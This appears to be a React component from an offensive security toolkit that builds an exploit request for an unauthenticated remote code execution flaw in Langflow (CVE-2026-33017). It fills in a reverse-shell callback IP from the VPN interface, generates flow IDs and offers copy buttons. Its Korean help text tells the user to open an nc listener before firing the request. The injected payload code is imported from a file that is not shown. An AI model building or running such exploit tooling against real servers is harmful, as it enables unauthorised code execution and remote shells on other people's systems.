import { useEffect, useState } from "react";
import { buildLangflowRceBody, buildLangflowRcePath, LANGFLOW_RCE_CODE } from "./langflowRcePayload";

function randomFlowId(): string {
  return "00000000-0000-4000-8000-000000000000".replace(/[08]/g, (c) =>
    (Number(c) ^ (crypto.getRandomValues(new Uint8Array(1))[0] & (Number(c) === 0 ? 15 : 3))).toString(16));
}

// Reference-only, like Log4ShellPayloadReference: builds the exact request
// for CVE-2026-33017 (Langflow < 1.9.0 unauthenticated RCE via
// POST /api/v1/build_public_tmp/{flow_id}/flow), never sends it itself.
// build_public_tmp needs no pre-existing flow -- any UUID-shaped flow_id
// works, since the endpoint builds a throwaway graph from the request body
// rather than looking one up.
export default function LangflowRcePayloadReference({ onUseInRequest }: {
  onUseInRequest?: (opts: { path: string; body: string }) => void;
}) {
  const [lhost, setLhost] = useState("");
  const [lport, setLport] = useState("4444");
  const [flowId, setFlowId] = useState(randomFlowId);
  const [copied, setCopied] = useState<string>();

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      const response = await fetch("/api/vpn/status");
      if (!response.ok || cancelled) return;
      const data = await response.json();
      const match = /(\d{1,3}\.){3}\d{1,3}/.exec(data.tun0 || "");
      if (match && !cancelled) setLhost((current) => current || match[0]);
    })();
    return () => { cancelled = true; };
  }, []);

  const code = LANGFLOW_RCE_CODE
    .replaceAll("{LHOST}", lhost || "{LHOST}")
    .replaceAll("{LPORT}", lport || "{LPORT}");
  const path = buildLangflowRcePath(flowId || "{FLOW_ID}");
  const body = buildLangflowRceBody(code);

  const copy = async (text: string, label: string) => {
    await navigator.clipboard.writeText(text);
    setCopied(label);
    window.setTimeout(() => setCopied((current) => (current === label ? undefined : current)), 1500);
  };

  return (
    <div className="sqlPayloadReference" aria-labelledby="langflow-rce-heading">
      <div className="webSectionTitle">
        <span>Langflow 무인증 RCE (CVE-2026-33017 · GHSA-vwmf-pq79-vjvx · CVSS 9.3)</span>
        <h2 id="langflow-rce-heading">build_public_tmp 페이로드</h2>
        <p>
          {lhost
            ? <>탐지된 tun0 IP <code>{lhost}</code>를 리버스쉘 콜백 주소로 자동 채웁니다.</>
            : <>tun0 IP를 아직 못 찾았습니다 — VPN이 연결돼 있는지 확인하세요.</>}
          {" "}Langflow &lt;1.9.0의 <code>build_public_tmp</code>는 인증 없이 커스텀 컴포넌트의
          <code>code</code> 필드를 그대로 <code>exec()</code>합니다 — 대입문(assignment)은
          그래프를 실행하지 않아도 빌드 시점에 즉시 실행되므로, 먼저 아래 LPORT로
          리스너(<code>nc -lvnp {lport}</code>)를 열어두고 요청을 보내면 곧바로 콜백이 옵니다.
        </p>
        <div className="netexecCredForm">
          <input value={lport} onChange={(e) => setLport(e.target.value)}
            placeholder="LPORT" aria-label="LPORT" />
          <input value={flowId} onChange={(e) => setFlowId(e.target.value)}
            placeholder="flow_id" aria-label="flow_id" />
          <button type="button" onClick={() => setFlowId(randomFlowId())}>
            flow_id 새로 생성
          </button>
        </div>
      </div>
      <div className="sqlPayloadCategory">
        <div className="sqlPayloadList">
          <div className="sqlPayloadRow">
            <div>
              <b>엔드포인트</b>
              <code>POST {path}</code>
            </div>
            <div className="sqlPayloadActions">
              <button onClick={() => void copy(path, "path")}>
                {copied === "path" ? "복사됨" : "경로 복사"}
              </button>
            </div>
          </div>
          <div className="sqlPayloadRow">
            <div>
              <b>요청 본문 (JSON)</b>
              <code style={{ display: "block", whiteSpace: "pre-wrap", wordBreak: "break-all" }}>
                {body}
              </code>
            </div>
            <div className="sqlPayloadActions">
              <button onClick={() => void copy(body, "body")}>
                {copied === "body" ? "복사됨" : "본문 복사"}
              </button>
              {onUseInRequest && <button onClick={() => onUseInRequest({ path, body })}>
                요청 편집기에 채우기
              </button>}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
